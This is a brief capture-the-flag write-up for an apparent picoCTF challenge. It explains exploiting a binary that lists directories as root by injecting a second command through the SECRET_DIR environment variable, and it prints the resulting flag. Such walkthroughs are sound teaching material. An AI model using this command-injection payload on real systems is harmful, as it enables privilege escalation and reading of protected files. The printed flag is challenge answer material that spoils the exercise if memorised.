Points: 200

## **Description**
---
We've got a binary that can list directories as root, try it out !!
Additional details will be available after launching your challenge instance

## **Hints**
None.

## **Approach**
First the script expects us to have an environment variable set for SECRET_DIR.

There are two potential directories that have the same flag (I checked):
```
/challenge
/root
```
I originally picked /root.

Running the program it gives returns:
```
Listing the content of /root as root:
flag.txt
```

I tried to add a "cat" command while setting the eviroment variable and run file bin
```
export SECRET_DIR=/root' && cat /root/flag.txt'
./bin
Listing the content of /root && cat /root/flag.txt as root:
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}
```
And we did it!
